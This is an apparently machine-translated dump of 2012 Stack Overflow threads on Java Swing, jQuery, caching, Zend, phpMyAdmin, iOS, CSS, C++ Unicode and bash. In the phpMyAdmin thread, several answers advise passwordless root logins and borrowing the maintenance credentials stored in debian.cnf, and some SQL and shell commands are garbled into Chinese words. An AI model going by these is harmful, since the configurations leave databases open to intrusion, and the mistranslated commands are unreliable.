                int roachClustersNum = (int)Total(0, 0, roachClustersTF);
                int crystalPineappleNum = (int)Total(0, 0, crystalPineappleTF);
                int droobleGumNum = (int)Total(0, 0, droobleGumTF);
                int explodeBonbonsNum = (int)Total(0, 0, explodeBonbonsTF);
                int fizzWhizNum = (int)Total(0, 0, fizzWhizTF);
                int iceMiceNum = (int)Total(0, 0, iceMiceTF);
                int jellySlugsNum = (int)Total(0, 0, jellySlugsTF);
                int liquorWandsNum = (int)Total(0, 0, liquorWandsTF);
                int pepImpsNum = (int)Total(0, 0, pepImpsTF);
                int pinkCocoIceNum = (int)Total(0, 0, pinkCocoIceTF);
                int shockChocNum = (int)Total(0, 0, shockChocTF);
                int spindleSpidersNum = (int)Total(0, 0, spindleSpidersTF);
                int sugarQuillsNum = (int)Total(0, 0, sugarQuillsTF);
                int wizochocNum = (int)Total(0, 0, wizochocTF);

                cart = new ArrayList();

                addCart("Acid Pops", acidPopsNum, acidPopsCost);
                addCart("Bertie Botts Every Flavour Beans", bertieBottsNum, bertieBottsCost);
                addCart("Blood-flavoured Lollipops", bloodPopsNum, bloodPopsCost);
                addCart("Cauldron Cakes", cauldronCakesNum, cauldronCakesCost);
                addCart("Charm Choc", charmChocNum, charmChocCost);
                addCart("Chocoballs", chocoballsNum, chocoballsCost);
                addCart("Chocolate Cauldrons", chocCauldronsNum, chocCauldronsCost);
                addCart("Chocolate Frogs", chocFrogsNum, chocFrogsCost);
                addCart("Chocolate Wands", chocWandsNum, chocWandsCost);
                addCart("Cockroach Clusters", roachClustersNum, roachClustersCost);
                addCart("Crystallised Pineapple", crystalPineappleNum, cauldronCakesCost);
                addCart("Drooble's Best Blowing Gum", droobleGumNum, droobleGumCost);
                addCart("Exploding Bonbons", explodeBonbonsNum, explodeBonbonsCost);
                addCart("Fizzing Whizbees", fizzWhizNum, fizzWhizCost);
                addCart("Ice Mice", iceMiceNum, iceMiceCost);
                addCart("Jelly Slugs", jellySlugsNum, jellySlugsCost);
                addCart("Liquorice Wands", liquorWandsNum, liquorWandsCost);
                addCart("Pepper Imps", pepImpsNum, pepImpsCost);
                addCart("Pink Coconut Ice", pinkCocoIceNum, pinkCocoIceCost);
                addCart("Shock-o-Choc", shockChocNum, shockChocCost);
                addCart("Splindle's Lick'O'Rish Spiders", spindleSpidersNum, spindleSpidersCost);
                addCart("Sugar Quills", sugarQuillsNum, sugarQuillsCost);
                addCart("Wizochoc", wizochocNum, wizochocCost);

                cart.remove(cart.size());
                cartArray = cart.toArray();

                cl2.show(mainPanel, CART);
            }
        }

        double Total(int i, double p, JTextField t)
        {
            if (i == 1)
            {
                try
                {
                    return (p* (Integer.parseInt(t.getText())));
                }
                catch (NumberFormatException e) { return 0; }
            }
            else
            {
                try
                {
                    return Integer.parseInt(t.getText());
                }
                catch (NumberFormatException e) { return 0; }
            }
        }

        void addCart(String p, int n, String c)
        {
            if (n > 0)
            {
                cart.add(p);
                cart.add(n);
                cart.add(c);
                cart.add("");
            }
        }
    }
} 
```

例外：

```
 at java.awt.Container.dispatchEventImpl(Container.java:2273)
        at java.awt.Window.dispatchEventImpl(Window.java:2713)
        at java.awt.Component.dispatchEvent(Component.java:4687)
        at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:707)
        at java.awt.EventQueue.access$000(EventQueue.java:101)
        at java.awt.EventQueue$3.run(EventQueue.java:666)
        at java.awt.EventQueue$3.run(EventQueue.java:664)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDo
main.java:76)
        at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDo
main.java:87)
        at java.awt.EventQueue$4.run(EventQueue.java:680)
        at java.awt.EventQueue$4.run(EventQueue.java:678)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDo
main.java:76)
        at java.awt.EventQueue.dispatchEvent(EventQueue.java:677)
        at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThre
ad.java:211)
        at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.
java:128)
        at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThre
ad.java:117)
        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:113)

        at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:105)

        at java.awt.EventDispatchThread.run(EventDispatchThread.java:90) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:09:34.733

运行代码并单击 Checkout 按钮时，我在该行收到 NullPointerException

```
return (p* (Integer.parseInt(t.getText()))); 
```

尝试检查您传递给 Total() 的 JTextField 是否已正确设置。您可能需要添加另一个`catch`块以防止应用程序崩溃：

```
catch (Exception e) {
    e.printStackTrace();
    return 0;
} 
```

**更新**

实际问题是您尝试通过将各种`JTextField`组件传递给**构建**器方法来初始化它们的方式，例如

```
verticalBuilder("filename", "html", acidPopsTF, acidPopsCard); 
```

您需要从构建器**返回**文本字段并将其分配给字段/成员，如下所示：

```
acidPopsTF = verticalBuilder("filename", "html", acidPopsCard); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T06:59:59.147

试试这个方法

```
 switchCard.addActionListener(new ActionListener() {
        public void actionPerformed(ActionEvent e) {
            System.out.println("Can you see this logged?");
        }
    }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:06:36.533

您的循环孔似乎位于此处：

```
if (e.getSource() == switchCard)
{
    cl.show(infoPanel, (String)candyList.getSelectedValue());
    checkoutButton.addActionListener(this);
} 
```

由于您在这里`this`将其称为参数，因此将其替换`b1`为您在外部类中使用的 。所以让我们`ButtonListener`成为一个实例变量，而不是`ClientApp`类的构造函数的本地变量。

```
if (e.getSource() == switchCard)
{
    cl.show(infoPanel, (String)candyList.getSelectedValue());
    checkoutButton.addActionListener(b1);
} 
```

**最新编辑：**

当我浏览您的代码时，我意识到您没有在`JTextField`任何地方初始化您的 s，您只是编写`private JTextField acidPopsTF;`然后将`acidPopsTF and other JTextField`s 传递给方法，而不进行初始化，那是您的问题，首先在某个地方初始化它们`private JTextField acidPopsTF = new JTextField(10);`

**另一个编辑：**

你也需要检查这条线，因为它一定会给你`ArrayIndexOutOfBoundsException`

```
cart.remove(cart.size()); 
```

好像你的`addCart(...)`方法根本不起作用，如果你把一个`System.out.println(...)`放在里面`if block`，你什么也得不到:(作为输出。

**再编辑一次**

我觉得你为什么写这些行很奇怪

```
int acidPopsNum = (int)Total(0, 0, acidPopsTF); 
```

由于您提供`0`作为第一个参数，因此`Total(...)`方法中的第一个条件即`if (i == 1)`永远不会得到满足。您也应该检查这段代码。

# jquery - 在 Uri 中使用转义字符的 jQuery Ajax 调用

> ID：11427082
> 
> 赞同：2
> 
> 时间：2012-07-11T06:50:15.220
> 
> 标签：jquery, ajax, encodeuricomponent

我正在通过 jQuery 对`GET`服务方法进行 Ajax 调用。问题是使用的参数的值可以包含`/`字符，所以我决定使用该**`encodeURIComponent()`**方法从参数中转义特殊字符。结果是`/`字符被转换为`%5`并试图在 Ajax 请求中使用转义参数。我的代码看起来像：

```
var id = "some/id";

$.ajax({
url: "http://www.mywebsite.com/getValue/" + encodeURIComponent(id),
dataType: "text",
type: 'GET',
async: true,
cache: false,

    success: function (response, textStatus, jqXHR) {
    alert("success");       
    },

    error: function (jqXHR, textStatus, errorThrown) {
    alert("error");
    }
}); 
```

不知何故 jQuery`unescapes`的 uri 值，没有调用服务器，我收到一个错误代码（如果参数中不存在，`404 error`调用工作正常。`/`

知道如何在 Ajax 调用中发送此类参数，或者我的代码做错了什么吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-12-14T21:38:01.623

为避免对“/”进行编码，您可以将 encodeURIComponent 替换为 encodeURI。[来源](http://msdn.microsoft.com/en-us/library/aeh9cef7%28VS.85%29.aspx)。

旁注 - %5 是反斜杠的编码版本，而您给出的示例是正斜杠。这可能指向另一个额外的问题。

# javascript - javascript - 关闭浏览器时清除缓存的代码

> ID：11427084
> 
> 赞同：1
> 
> 时间：2012-07-11T06:50:23.297
> 
> 标签：javascript, session, session-variables, session-cookies

在我的 Web 应用程序中，我希望 java 脚本在用户关闭浏览器时清除缓存。

javascript 应该监听事件并清除缓存。

谁能给我提供示例代码或任何有用的链接？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-11T06:58:29.693

技术上是不可能的。您可以做的是通过使用以下元标记告诉浏览器不要缓存页面：

```
<meta http-equiv='cache-control' content='no-cache'>
<meta http-equiv='expires' content='0'>
<meta http-equiv='pragma' content='no-cache'> 
```

这里有一篇文章供参考[http://www.htmlgoodies.com/beyond/reference/article.php/3472881](http://www.htmlgoodies.com/beyond/reference/article.php/3472881)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T06:59:28.507

对于清除缓存跟随链接很有帮助 [清除 JavaScript 中的缓存](https://stackoverflow.com/questions/1011605/clear-the-cache-in-javascript)

当您尝试关闭浏览器时，您编写了一些 javascript 运行，如下所示

```
window.onbeforeunload = function ()
{
    // write your code here
 } 
```

但是为什么你需要在关闭浏览器之前清除缓存呢？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:03:33.780

是的，这是不可能的，但我建议您可以尝试元标记，或者您可以设置一个版本控制系统，例如这样

```
<?php
session_start();
$versionNumber = '';
if(!isset($_SESSION['versionNumber']))
{
    $versionNumber = time() ;
    $_SESSION['versionNumber'] = $versionNumber;
}
else
{
    $versionNumber = $_SESSION['versionNumber'];
}
?>
<script src="home.js?v=<?php echo $versionNumber; ?>" ></script> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-11T07:25:02.767

使用 JavaScript 是不可能的。但是使用 no-cache header 你可以做到。

使用[适用于所有浏览器的这些方法之一](https://stackoverflow.com/questions/49547/making-sure-a-web-page-is-not-cached-across-all-browsers)

# zend-framework - 如何在 Zend 中关闭通知抑制？

> ID：11427089
> 
> 赞同：1
> 
> 时间：2012-07-11T06:50:34.467
> 
> 标签：zend-framework

Zend 会自动抑制通知，如何在通知发生时更改此应用程序以停止执行？

例如，未定义的变量或缺少参数（导致未定义的变量）将在错误日志中显示通知。如果此通知发生在写入数据库的方法中，则不会写入任何数据，也不会显示错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T08:11:24.280

检查中的 PHP 错误设置`application/configs/application.ini`。典型的设置是这样的：

```
[production]
phpSettings.display_startup_errors = 0
phpSettings.display_errors = 0

[development : production]
phpSettings.display_startup_errors = 1
phpSettings.display_errors = 1 
```

这意味着在生产模式中隐藏错误但在开发中显示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T09:21:39.487

确保您处于“开发”模式而不是“生产”模式。

签`index.php`入您的`public`文件夹：

```
defined('APPLICATION_ENV') || define('APPLICATION_ENV',(getenv('APPLICATION_ENV') ? getenv('APPLICATION_ENV'): 'production')); 
```

只需更改`production`为，`development`因为这将导致从开发部分读取配置`application/configs/application.ini`

```
[production]
phpSettings.display_startup_errors = 0
phpSettings.display_errors = 0

[development : production]
phpSettings.display_startup_errors = 1
phpSettings.display_errors = 1 
```

# mysql - phpMyAdmin 说没有权限创建数据库，尽管以 root 用户身份登录

> ID：11427091
> 
> 赞同：25
> 
> 时间：2012-07-11T06:50:48.557
> 
> 标签：mysql, phpmyadmin

我需要使用 root 用户登录 mysql 并创建一个数据库。但是，当我以 root 用户身份登录 PhpMyAdmin 时，它告诉我它“没有权限”，因此无法创建数据库。

当我安装 phpMyAdmin 时，我没想到会发生这种情况。有没有办法解决这个问题？请帮忙，谢谢！

版本信息：

操作系统：OpenSUSE 12.1

MySQL：mysql Ver 14.14 Distrib 5.5.25，适用于 Linux (x86_64)，使用 readline 6.2

PhpMyAdmin：3.4.10.2

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2019-02-15T04:36:32.567

使用安装 phpMyAdmin 时创建的系统维护用户和密码登录。
它可以在 /etc/mysql 的 debian.cnf 文件中找到，然后您将拥有完全访问权限。

```
cd /etc/mysql
sudo nano debian.cnf
Just look - don't change anything!
[mysql_upgrade]
host     = localhost
user     = debian-sys-maint       <----use this user
password = s0meRaND0mChar$s       <----use this password
socket   = /var/run/mysqld/mysqld.sock 
```

为我工作。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-07-11T06:58:32.953

如果您使用的是 Chrome。尝试其他浏览器。以前关于这个问题的帖子说 phpmyadmin 没有在 chrome 上为 root 提供权限。

或试试这个

名称：根

密码：密码

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2020-06-10T22:11:20.560

须藤mysql

输入您的 (LINUX) 帐户密码

将 *.* 上的创建授予 user@localhost；

同花顺特权；

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2014-04-02T09:19:38.217

这对我有用

在 phpmyadmin 根目录中打开 config.inc.php 文件，将身份验证类型从 cookie 设置为 config

```
$cfg['Servers'][$i]['auth_type'] = 'config';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = ''; // leave blank if no password 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-07-11T06:52:51.180

查看您的权限的用户和主机列。您来自本地主机或其他一些 IP 的位置确实会有所不同。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-03-10T19:54:51.420

使用这些：

*   用户名：根
*   密码：（无）

然后您将获得具有权限的页面（比管理页面更多的选项）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-12-12T14:45:42.127

这对我有用（在 Chrome 中）：

登录到 phpmyadmin，然后按照`"Home" -> "Privileges" -> "Reload the Privileges"`. 在此之后，清除浏览器的缓存并重试。

问候，佩德罗·索萨

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-11-26T23:53:25.943

以 root 身份登录终端并执行以下命令：

mysql_secure_installation

键入 n 以不更改 root 密码并按 Enter，然后键入 y 删除匿名用户并按 Enter。如果要禁止远程 root 登录，请键入 n，然后按 Enter。现在输入 y 删除测试表和数据库并按回车，然后再次输入 y 并按回车。

你很高兴:)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2020-01-23T07:09:02.900

我就这样解决了我的问题。您需要将 auth_type 'config' 更改为 'http'。我的旧设置 auth_type 是 'config' 然后我更改为 'http' 并解决了问题。

当您更改该区域并输入 phpMyAdmin 时，浏览器会询问您一个用户名和密码。您只需输入“root”，不要填写密码区域，然后按 Enter。

```
/* Authentication type and info */
$cfg['Servers'][$i]['auth_type'] = 'http';
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = '';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['AllowNoPassword'] = true;
$cfg['Lang'] = ''; 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-08-23T05:23:55.893

我的问题出在我下载的 KSWEB 应用程序上。我没有权限错误，但是当我打开 config.inc.php 并更改时

```
$cfg['Servers'][$i]['auth_type'] = 'cookie'; 
```

到

```
$cfg['Servers'][$i]['auth_type'] = 'config'; 
```

它起作用了，我现在有权创建数据库。

* * *

## 回答 #11

> 赞同：-3
> 
> 时间：2012-07-12T05:13:33.993

这似乎是一个暂时的问题，并在之后自行修复。感谢大家的关注。

# scala - 提升和类型安全

> ID：11427093
> 
> 赞同：5
> 
> 时间：2012-07-11T06:50:52.317
> 
> 标签：scala, lift

我现在正在学习电梯。当我阅读模板时，我了解到它们有很多在编译时没有进行类型检查的东西：

*   模板可能包含对不存在的片段的引用
*   站点地图可能引用不存在的页面
*   片段调度方法采用字符串参数，我们可以很容易地打错字

是否有任何替代方法可以使此问题不那么严重，即库中的外部代码检查器或选项允许以类型安全的方式执行相同操作？或者可能有另一个在这种关系上更严格的 Web 框架（可能是其他语言）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T12:43:12.590

类型检查是 Scala 或 Java 等强类型语言的编译时特性，它允许验证签名和类型之间的关系。此类检查将阻止您在需要 Meat 类型的参数时传递 Banana 类型的参数，或者将 String 分配给 Int 类型的变量。通常，在 Ruby 或 Javascript 等动态语言中，这是不可能的

您正在寻找的**不是类型检查器**。您不想验证您的程序在语法上是否正确，而是要验证它的行为是否正确，解决方案称为自动化测试。

您完全能够编写语法正确但行为错误的代码：

```
public boolean isTrue(boolean value){
        return !value;
} 
```

如果您反过来想，您将如何在编译时测试需要填充一些数据的模板的正确性？

```
 <!-- importing a snippet depending on the value of a variable -->
 <import src="${snippetName}.xml"/> 
```

你不能，因为你在编译时的所有变量都绝对没有价值。这就是为什么自动化测试很重要并且为您的应用程序编写测试用例不能被编译时检查取代的原因。

# ios - 如何在 imagePicker 中选择视频

> ID：11427095
> 
> 赞同：1
> 
> 时间：2012-07-11T06:51:22.987
> 
> 标签：ios, video, uiimagepickercontroller

这是我从 imagePicker 中挑选视频的代码：

```
imagepicker = [[UIImagePickerController alloc] init];
[imagepicker setDelegate:self];      

NSArray *mediaTypesAllowed = [UIImagePickerController availableMediaTypesForSourceType:UIImagePickerControllerSourceTypePhotoLibrary];
[imagepicker setMediaTypes:mediaTypesAllowed];

imagepicker.wantsFullScreenLayout = YES;

pickImagePop = [[UIPopoverController alloc] initWithContentViewController:imagepicker];

[pickImagePop setDelegate:self];
[pickImagePop presentPopoverFromRect:CGRectMake(60, 100, 1, 20) inView:self.view permittedArrowDirections:UIPopoverArrowDirectionUp animated:YES];
[pickImagePop setPopoverContentSize:CGSizeMake(320, 400) animated:YES]; 
```

但是这段代码在 Picker 中同时显示照片和视频。我只想显示视频。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:02:46.673

如果您只想要视频，您应该添加：

```
imagepicker.mediaTypes =
[[NSArray alloc] initWithObjects: (NSString *) kUTTypeMovie, nil]; 
```

请记住将`MobileCoreServices`框架添加到您的项目中。

编辑：

您应该通过以下方法预先检查设备可以使用哪些类型。

```
+ (NSArray *)availableMediaTypesForSourceType:(UIImagePickerControllerSourceType)sourceType 
```

它将返回一个包含设备支持的所有媒体类型的数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-14T13:20:22.853

**试试这个**

```
 1.Add MobileCoreServices framework to your project and import to your view controller
  #import <MobileCoreServices/UTCoreTypes.h> .
 2.Add this delegate methods in Interface 
    <UIImagePickerControllerDelegate, UINavigationControllerDelegate>
 3.Create a Button Action for Record Video and play video like this

- (IBAction)recordVideo:(UIButton*)sender {
    UIImagePickerController *videoScreen = [[UIImagePickerController alloc] init];
    videoScreen.sourceType = UIImagePickerControllerSourceTypeCamera;

    // Displays movie capture control
    videoScreen.mediaTypes = [[NSArray alloc] initWithObjects:(NSString *)kUTTypeMovie, nil];

    videoScreen.allowsEditing = NO;
    videoScreen.delegate = self;

    [self presentViewController:videoScreen animated: YES completion:NO];
}

//ImagePickerDelegate

-(void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
    NSString *mediaType = [info objectForKey: UIImagePickerControllerMediaType];
    [self dismissViewControllerAnimated:NO completion:NO];
    // Handle a movie capture
    if (CFStringCompare ((__bridge_retained CFStringRef) mediaType, kUTTypeMovie, 0) == kCFCompareEqualTo) {
        NSString *moviePath = [[info objectForKey:UIImagePickerControllerMediaURL] path];
        if (UIVideoAtPathIsCompatibleWithSavedPhotosAlbum(moviePath)) {
            UISaveVideoAtPathToSavedPhotosAlbum(moviePath, self, nil, nil);
        }
    }
}
}

- (IBAction)playVideo:(id)sender {
    UIImagePickerController *mediaLibrary = [[UIImagePickerController alloc] init];
    mediaLibrary.sourceType = UIImagePickerControllerSourceTypeSavedPhotosAlbum;
    mediaLibrary.mediaTypes = [[NSArray alloc] initWithObjects: (NSString *) kUTTypeMovie, nil];

    mediaLibrary.allowsEditing = NO;
    [self presentViewController:mediaLibrary animated:YES completion:NO];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-19T14:09:31.813

```
 UIImagePickerController *imagePicker = [[UIImagePickerController alloc] init];
    imagePicker.delegate = self;
    imagePicker.sourceType = UIImagePickerControllerSourceTypeSavedPhotosAlbum;
    imagePicker.mediaTypes = [NSArray arrayWithObject:(NSString *)kUTTypeMovie];
    NSArray *sourceTypes = [UIImagePickerController availableMediaTypesForSourceType:imagePicker.sourceType];
    if (![sourceTypes containsObject:(NSString *)kUTTypeMovie ])
    {
        //NSLog(@"no video");
    }

    [self presentModalViewController:imagePicker animated:YES];

 - (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info
    {
            NSString *type = [info objectForKey:UIImagePickerControllerMediaType];
            //NSLog(@"type=%@",type);
            if ([type isEqualToString:(NSString *)kUTTypeVideo] || 
                [type isEqualToString:(NSString *)kUTTypeMovie])
            {// movie != video
                NSURL *urlvideo = [info objectForKey:UIImagePickerControllerMediaURL];
}
    } 
```

# css - CSS 选择器优先级

> ID：11427101
> 
> 赞同：0
> 
> 时间：2012-07-11T06:52:02.860
> 
> 标签：css, css-selectors

为什么css选择器

```
select, textarea, input[type="text"], input[type="password"],input[type="datetime"], input[type="datetime-local"], input[type="date"], input[type="month"], input[type="time"], input[type="week"], input[type="number"], input[type="email"], input[type="url"], input[type="search"], input[type="tel"], input[type="color"], .uneditable-input 
```

优先于

```
input.text-style 
```

对于以下 html：

```
<input type="text" required="required" name="poemDataCollector[name]" id="poemDataCollector_name" class="text-style"> 
```

我读到该类应该优先于html标签...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T06:53:52.627

属性选择器同样特定于类选择器。

如果你想重写这个类，你可以这样写：

```
input.text-style[type="text"] 
```

检查此决定以获取更多信息[属性选择器的特殊性是什么？](https://stackoverflow.com/questions/11406953/what-is-the-specificity-of-the-attribute-selector)

阅读此[http://www.w3.org/TR/selectors/#specificity](http://www.w3.org/TR/selectors/#specificity)

# c++ - 从包含 utf-8(HINDI) 格式文本的文件中读取并写入另一个文件

> ID：11427103
> 
> 赞同：1
> 
> 时间：2012-07-11T06:52:14.733
> 
> 标签：c++, visual-c++, file-handling, wchar-t, widechar

我正在尝试从文件中读取字符并在删除标点符号后。我想将单词存储在一个数组中，最后将它们写入另一个文件。该文件的内容是：-

> “ **यौताबाबूउदयभाहूउपेक्षाऔंरअपमान्नकीपीड््ाढोये जैसेतैस्येवहबाबाकेआश्रमम्पेंपहैचगया 。बाबामान्नोउसीकीप्रतीक्षाम्पेंवैठेथे。वहज्योहीदण्डवतकीमुदाम्पेंहुभ्रात्योंही बाबाकागभ्रीरस्वरउसकेकानोंम्पेटकराया 'आभ्रो，ञैंतुम्हारेलिएहीबैठाहूें 'अमितन्नेमस्तकऊैंचाउठायाऔंरएकाम्रभाव न्सेबाबाकोदेखतारहा 。बाबाकेपासवहअनेकोंबारआचुका थापरन्तु 。आजजैसीव्यथा，थकान्नऔंरप्तानताइससेदूर्वनहींथीआदमी कभ्रीकभीइतनाटूटञाताड़ँकिठसेअपनेअस्तिल्दकेप्रति भलगतीलगतीलगतीवहवहखोपेंपेंपेंखोउसकेउसकेउसकेकौकौकौकौहेहेहेहेथेथे** ...........

我尝试使用旧的 turbo c++ 读取这些字符（印地语 - utf-8）。使用简单的 char*数据类型*。

程序已编译，但内容未正确写入文件。然后我在*visual c++*中使用相同的代码和相同的代码，我得到了错误——

`"Debug assertion failed ... unsigned(c+1) <=256"`

接下来我尝试为此目的使用宽字符数据类型。`using<wchar.h>`和`<cwchar.h>`头文件和数据类型**wchar_t**和其他宽字符函数，但输出仍然不正确 - **“���त�ྤ���௤ྤ�”**

是否有任何替代方法或任何其他方法来解决此问题。

用完整的代码段回答还告诉我 wchar 的 getline 函数的替代方法是什么。这就是我试图做的......

```
#include<sstream>
#include<iostream>
#include<fstream>
#include<ctype.h>
#include<string>
#include<stdio.h>
#include<conio.h>
#include <istream>
#include<vector>
#include<string>
#include<stdlib.h>
#include<iostream>
#include<fstream>
#include<ctype.h>
#include<string.h>
#include<stdio.h>
#include<conio.h>
#include<vector>
#include<wchar.h>
#include<cwchar>
#include <locale.h>
#include <cwchar>
using namespace std;
unsigned char line[1000],storech[2000],storech1[20000];
wchar_t word[50];
std::vector< wchar_t* > storewrd;

void main()
{ 
    FILE * file3 = fopen("H:\\myfile.txt" , "w");
    cout << "check" << endl;
    FILE *stream;
    stream = fopen( "H:\\ocr.txt", "r" );
    setlocale(LC_ALL,"");
    int ch;
    int  test;
    wchar_t temp1;
    wchar_t buffer[500];
    wchar_t temp[500];

    int x=0,j=0;
        do
    {
        int loop = 0;
        ch = fgetwc(stream);

        //read word 
        while( (ch != '\n') && (ch != WEOF) ) 
        {
                buffer[loop] = ch;
            loop++;

         test = fgetwc(stream);
         temp1 = (wchar_t) test;
         if(!iswpunct(test))    
         fputwc( test , file3);
             wcout << temp1 << "  ";

        }

            int t;
        if (ch!= WEOF)
        {
             for(t=0;t<loop;t++)
             {
            temp[t] = buffer[t];
             }
             temp[loop++] = '\0';

                j++;
                //cout << buffer[loop] << "  ";
        }       
    }while(ch != WEOF);

    cout << "check";

    _getch();

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:11:37.920

您可以尝试为此使用[ICU 。](http://userguide.icu-project.org/boundaryanalysis)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:25:30.217

Stdio 文件函数，如 fwprintf 或 fputwc 在内部将输出转换为 ASCII，即使使用 unicode 变体也是如此。我也遇到过这个问题。

但是既然你的编码是UTF-8，那你为什么不把它读成ASCII，写成ASCII呢？UTF-8 以这样一种方式编码，它应该与不知道他们使用 UTF-8 而不是 ASCII 的程序一起工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T08:00:30.117

我不太清楚您要做什么：断言失败发生在哪里？您如何确定字符是否为标点符号？

UTF-8 是一种多字节编码，这意味着像单字节这样的函数`ispunct`对它不起作用。但是，它是一种可变长度编码，并且原始 ASCII 代码集中的所有字符都具有单字节编码。 *如果*您关心的唯一标点符号是原始 ASCII 中的字符，您可以“作弊”一点，并使用以下内容：

```
if ( (ch & 0x80) == 0 && ispunct( ch ) ) {
    //  is ASCII punctuation
} else {
    //  is something else
} 
```

我将“作弊”放在引号中，因为 Unicode 和 UTF-8 的目标之一是查找 ASCII 标点符号之类的代码应该保持不变。

如果您需要识别的不仅仅是 ASCII 标点符号（例如`«`,`¿`或`—`），并且您想使用`wchar_t` （通常但不总是 UTF-16 或 UTF-32），并且文件是 UTF-8，您将需要使用适当的语言环境来进行代码翻译。在这种情况下，您*绝对*应该使用 iostream，而不是 C 风格的 IO；iostream 将允许您使用适当的语言环境为流灌输，而 C++ 语言环境将允许您通过更改单个方面（`codecvt`，在这种情况下）来自另一个语言环境（可能是全局语言环境）。（在Linux下，全局语言环境，特别是在非英语地区，通常是UTF-8语言环境，可以直接使用。在Windows下，我希望它是UTF-16语言环境，不会翻译UTF -8 正确。）如果您不想参与语言环境，请将您的 UTF-8 直接读入 `char`缓冲区，然后使用`iconv`库或类似的东西在您的程序中翻译它。但是请注意，在基本平面之外可能会有一些罕见的标点符号，这些标点符号将使用 UTF-16 中的两个代理字符进行编码；`iswpunct`如果你的将不适用于这些`wchar_t`使用 UTF-16（Windows 和 AIX）。（基本位面之外的大多数字符都是 CJK 或来自今天未使用的历史脚本，所以这对您来说可能不是问题。）

# linux - 用于永久设置环境变量的 Shell 脚本

> ID：11427106
> 
> 赞同：3
> 
> 时间：2012-07-11T06:52:18.183
> 
> 标签：linux, bash, environment-variables

我需要编写一个 shell 脚本来设置环境变量并永久修改路径变量。有没有办法通过脚本修改 bashrc 文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T06:54:42.720

是的，您编写了一个使用 >> 重定向运算符附加到 .bashrc 的脚本：

```
echo Your Text >> ~/.bashrc 
```

另请参阅[I/O 重定向](http://tldp.org/LDP/abs/html/io-redirection.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T06:57:37.960

我宁愿直接修改 .bashrc 文件

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:05:08.013

**有没有办法通过脚本修改 bashrc 文件？**，你不需要这样做。

**只需在.bashrc**中手动设置所需的变量即可。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T11:14:58.110

你的问题太笼统了。您应该指定需要进行哪些更改。例如，一些回答者似乎没有想到的是，您可能需要编写脚本才能对系统上的多个帐户进行更改。

通常，您可以使用将在任何其他文本文件上使用的任何技术。一种方法是使用`sed`.

# http - 如何轻松地将文本附加到服务器上的现有文件？

> ID：11427107
> 
> 赞同：0
> 
> 时间：2012-07-11T06:52:22.427
> 
> 标签：http

我想将我的 iPhone 应用程序中的一些文本附加到我的网络服务器上已经存在的文件中。最简单的方法是什么？我不想让你给我写代码，只是告诉我从哪里开始以及我需要在我的网络服务器上运行什么（PHP？）

最初，每个应用程序都可以发布到不同的文件（我可以找出一些唯一标识符来帮助我）。稍后我可能希望将所有数据写入同一个文件，在这种情况下，我需要小心并发访问。

另外，我不确定身份验证应该如何工作；我是否应该要求每个用户或应用程序拥有不同的帐户和密码，这很难做到，因为那时我需要一种从应用程序内创建帐户的方法。或者我可以将所有用户的默认用户名和密码嵌入到应用程序中——但这可能会让我面临一些安全问题。

我还缺少什么？

编辑：我放弃了 iOS 标签，因为我认为这更像是一个网络服务器问题，而不是一个 iOS 问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:04:43.747

好吧，为了将字符串附加到您服务器上的文件中，我不得不说最简单的方法是将该字符串作为 HTTP 请求的参数发送到您的服务器。然后服务器进行附加。

